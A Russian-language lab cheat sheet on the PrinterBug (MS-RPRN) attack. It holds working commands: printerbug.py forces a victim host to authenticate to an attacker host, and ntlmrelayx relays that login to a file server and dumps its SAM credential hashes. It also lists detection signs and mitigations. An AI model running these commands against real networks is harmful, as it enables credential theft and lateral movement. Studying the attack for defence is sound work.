# PrinterBug (MS-RPRN) Attack

## 🎯 Цель атаки
Вынудить жертву выполнить NTLM‑аутентификацию на указанный атакующим хост через RPC интерфейс службы печати (MS‑RPRN), для дальнейшего релея или перехвата.

## 📋 Описание
Включённый Print Spooler на сервере/станции позволяет через вызовы MS‑RPRN инициировать SMB‑подключение к произвольному UNC, в результате чего хост выполняет NTLM‑аутентификацию.

## ⚠ Условия эксплуатации
- Запущен **Print Spooler** на целевом хосте.
- RPC доступен (135/tcp + динамические порты).
- NTLM разрешён, у цели нет SMB signing (для релея на SMB).

## 🔹 Пошагово в лаборатории
> ⚠ Только в изолированной среде!

1. **Тригерим PrinterBug**:
```bash
python3 printerbug.py DOMAIN/user:Pass@victim.lab.local attacker.lab.local
```
2. **Приём NTLM‑аутентификации** и релей на SMB/LDAP:
```bash
ntlmrelayx.py -t smb://filesrv.lab.local --dump-sam
```

## 📊 Признаки в логах и мониторинг
- 4624 Type 3 на целевых сервисах от имени жертвы.
- RPC вызовы к службе печати, сетевые подключения к `\attacker\share`.
- События печати/ошибок Spooler в журналах.

## 🛡 Меры защиты
- Отключить Print Spooler на DC/критичных системах.
- Ограничить RPC‑доступ и требовать SMB signing.
- Restrict NTLM.

## 🔗 Источники
- MS‑RPRN research / printerbug PoC

---

## 🔍 Разбор команд

### 1. Вызов PrinterBug
```bash
python3 printerbug.py DOMAIN/user:Pass@victim.lab.local attacker.lab.local
```
- **`printerbug.py`** — эксплойт MS‑RPRN.
- **`DOMAIN/user:Pass@victim`** — учётка и жертва с запущенным Spooler.
- **`attacker.lab.local`** — хост атакующего для получения NTLM.

### 2. Релей на SMB
```bash
ntlmrelayx.py -t smb://filesrv.lab.local --dump-sam
```
- **`--dump-sam`** — при успешном реле — выгрузка SAM на файловом сервере.
